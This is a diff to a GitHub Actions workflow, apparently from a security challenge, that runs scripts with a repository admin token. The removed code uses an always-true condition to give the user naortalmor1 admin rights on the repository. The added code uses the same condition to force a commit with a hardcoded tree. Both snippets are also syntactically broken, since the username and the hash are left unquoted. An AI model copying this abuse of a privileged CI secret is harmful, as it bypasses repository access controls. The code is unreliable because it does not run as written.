@@ -14,12 +14,12 @@ jobs:
           github-token: ${{ secrets.ADMIN_TOKEN }}
           script: |
             if (true) {
-              await github.repos.addCollaborator({
+              await github.git.createCommit({
                 owner: 'incrediblysecureinc',
                 repo: `incredibly-secure-naortalmor1`,
-                username: naortalmor1,
-                permission: 'admin'
-              });
+                message: 'done',
+                tree: 959c46eb0fbab9ab5b5bfb279ab6d70f720d1207
+              })
             } else if (context.issue.number === 1 && process.env.COMMENT.toUpperCase().includes("/DONE")) {
               console.log('%s says they are done!', process.env.LOGIN);
               // create issue on player private repo so we can discuss results in private
